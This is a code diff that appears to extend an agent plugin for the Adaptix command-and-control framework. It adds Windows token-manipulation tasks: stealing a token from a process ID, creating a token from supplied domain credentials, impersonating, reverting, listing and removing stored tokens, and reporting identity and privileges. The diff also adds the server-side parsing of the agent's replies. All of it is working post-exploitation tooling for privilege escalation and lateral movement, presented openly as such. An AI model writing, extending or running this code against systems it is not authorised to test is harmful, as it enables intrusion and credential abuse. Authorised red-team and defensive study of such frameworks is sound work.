@@ -196,6 +196,17 @@ const (
 	SCREENSHOT_CONTINUE = 0x2
 	SCREENSHOT_FINISH   = 0x3
 
+	// Token manipulation (free ids in the native 48-61 range): port of the
+	// native token.c against our wire.
+	COMMAND_TOKEN_STEAL  = 52
+	COMMAND_TOKEN_MAKE   = 53
+	COMMAND_TOKEN_IMPRS  = 54
+	COMMAND_TOKEN_REVERT = 55
+	COMMAND_TOKEN_LIST   = 56
+	COMMAND_TOKEN_REMOVE = 57
+	COMMAND_TOKEN_GETUID = 58
+	COMMAND_TOKEN_PRIVS  = 59
+
 	// BOF execution (native pl_utils.go).
 	COMMAND_EXEC_BOF     = 50
 	COMMAND_EXEC_BOF_OUT = 51
@@ -847,6 +858,79 @@ func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[stri
 
 	case "screenshot":
 		array = []interface{}{COMMAND_SCREENSHOT}
+
+	case "tkn":
+		switch subcommand {
+		case "steal":
+			var pid float64
+			pid, err = getFloatArg(args, "pid")
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{COMMAND_TOKEN_STEAL, int(pid)}
+			messageData.Message = fmt.Sprintf("Task: steal token from pid %v", int(pid))
+
+		case "make":
+			var domain, username, password string
+			domain, err = getStringArg(args, "domain")
+			if err != nil {
+				goto RET
+			}
+			username, err = getStringArg(args, "username")
+			if err != nil {
+				goto RET
+			}
+			password, err = getStringArg(args, "password")
+			if err != nil {
+				goto RET
+			}
+			// Logon type 2 (interactive), the native default path.
+			array = []interface{}{
+				COMMAND_TOKEN_MAKE, 2,
+				Ts.TsConvertUTF8toCp(domain, agentData.ACP),
+				Ts.TsConvertUTF8toCp(username, agentData.ACP),
+				Ts.TsConvertUTF8toCp(password, agentData.ACP),
+			}
+			messageData.Message = fmt.Sprintf("Task: make token for %s\\%s", domain, username)
+
+		case "impersonate":
+			var tokenId float64
+			tokenId, err = getFloatArg(args, "id")
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{COMMAND_TOKEN_IMPRS, int(tokenId)}
+			messageData.Message = fmt.Sprintf("Task: impersonate token %v", int(tokenId))
+
+		case "revert":
+			array = []interface{}{COMMAND_TOKEN_REVERT}
+			messageData.Message = "Task: revert to self"
+
+		case "list":
+			array = []interface{}{COMMAND_TOKEN_LIST}
+			messageData.Message = "Task: list stored tokens"
+
+		case "remove":
+			var tokenId float64
+			tokenId, err = getFloatArg(args, "id")
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{COMMAND_TOKEN_REMOVE, int(tokenId)}
+			messageData.Message = fmt.Sprintf("Task: remove token %v", int(tokenId))
+
+		case "getuid":
+			array = []interface{}{COMMAND_TOKEN_GETUID}
+			messageData.Message = "Task: get current identity"
+
+		case "privs":
+			array = []interface{}{COMMAND_TOKEN_PRIVS}
+			messageData.Message = "Task: list privileges"
+
+		default:
+			err = errors.New("subcommand must be 'steal', 'make', 'impersonate', 'revert', 'list', 'remove', 'getuid' or 'privs'")
+			goto RET
+		}
 
 	case "ps":
 		if subcommand == "list" {
@@ -1565,6 +1649,111 @@ func (e *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData [
 					_ = Ts.TsScreenshotAdd(agentData.Id, "", buf.Bytes())
 				}
 			}
+
+		case COMMAND_TOKEN_STEAL:
+			if false == packer.CheckPacker([]string{"int", "int", "array", "array"}) {
+				goto HANDLER
+			}
+			tokenId := packer.ParseInt32()
+			sourcePid := packer.ParseInt32()
+			domain := packer.ParseString()
+			user := packer.ParseString()
+			task.Message = fmt.Sprintf("Token [%v] stolen from pid %v (%s\\%s)",
+				tokenId, sourcePid, domain, user)
+			task.ClearText = fmt.Sprintf("%v\t%v\t%s\\%s", tokenId, sourcePid, domain, user)
+
+		case COMMAND_TOKEN_MAKE:
+			if false == packer.CheckPacker([]string{"int"}) {
+				goto HANDLER
+			}
+			tokenId := packer.ParseInt32()
+			task.Message = fmt.Sprintf("Token [%v] created", tokenId)
+
+		case COMMAND_TOKEN_IMPRS:
+			if false == packer.CheckPacker([]string{"byte"}) {
+				goto HANDLER
+			}
+			ok := packer.ParseInt8()
+			if ok == 0 {
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = "Impersonation failed (token not found or ImpersonateLoggedOnUser refused)"
+			} else {
+				task.Message = "Now impersonating the stored token"
+			}
+
+		case COMMAND_TOKEN_REVERT:
+			if false == packer.CheckPacker([]string{"byte"}) {
+				goto HANDLER
+			}
+			ok := packer.ParseInt8()
+			if ok == 0 {
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = "RevertToSelf failed"
+			} else {
+				task.Message = "Reverted to self"
+			}
+
+		case COMMAND_TOKEN_LIST:
+			if false == packer.CheckPacker([]string{"int"}) {
+				goto HANDLER
+			}
+			count := packer.ParseInt32()
+			lines := "ID\tPID\tUSER"
+			for i := 0; i < int(count); i++ {
+				if false == packer.CheckPacker([]string{"int", "int", "array", "array"}) {
+					goto HANDLER
+				}
+				tokenId := packer.ParseInt32()
+				sourcePid := packer.ParseInt32()
+				domain := packer.ParseString()
+				user := packer.ParseString()
+				lines += fmt.Sprintf("\n%v\t%v\t%s\\%s", tokenId, sourcePid, domain, user)
+			}
+			if count == 0 {
+				lines += "\nNo stored tokens"
+			}
+			task.Message = "Stored tokens:"
+			task.ClearText = lines
+
+		case COMMAND_TOKEN_REMOVE:
+			if false == packer.CheckPacker([]string{"byte"}) {
+				goto HANDLER
+			}
+			found := packer.ParseInt8()
+			if found == 0 {
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = "Token not found"
+			} else {
+				task.Message = "Token removed"
+			}
+
+		case COMMAND_TOKEN_GETUID:
+			if false == packer.CheckPacker([]string{"array"}) {
+				goto HANDLER
+			}
+			uid := packer.ParseString()
+			task.Message = "Current token UID:"
+			task.ClearText = uid
+
+		case COMMAND_TOKEN_PRIVS:
+			if false == packer.CheckPacker([]string{"int"}) {
+				goto HANDLER
+			}
+			count := packer.ParseInt32()
+			lines := "PRIVILEGE\tENABLED"
+			for i := 0; i < int(count); i++ {
+				if false == packer.CheckPacker([]string{"byte", "array"}) {
+					goto HANDLER
+				}
+				enabled := packer.ParseInt8()
+				name := packer.ParseString()
+				lines += fmt.Sprintf("\n%s\t%v", name, enabled != 0)
+			}
+			if count == 0 {
+				lines += "\nNo privileges"
+			}
+			task.Message = "Token privileges:"
+			task.ClearText = lines
 
 		case COMMAND_EXFIL:
 			if false == packer.CheckPacker([]string{"int", "byte"}) {
